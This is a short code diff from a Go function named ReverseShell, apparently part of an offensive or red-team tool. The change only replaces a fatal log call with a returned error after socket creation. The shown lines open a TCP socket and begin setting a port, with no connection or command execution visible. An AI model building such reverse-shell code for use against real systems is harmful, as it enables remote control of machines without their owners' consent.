@@ -36,7 +36,7 @@ func ReverseShell(args []string) (string, error) {
 	}
 	GoSock, err := unix.Socket(unix.AF_INET, unix.SOCK_STREAM, 0)
 	if err != nil {
-		log.Fatalf("Failed to create socket %v", err)
+		return "",fmt.Errorf("Failed to create socket %v", err)
 	}
 	sockaddr_in := &unix.SockaddrInet4{}
 	sockaddr_in.Port = port
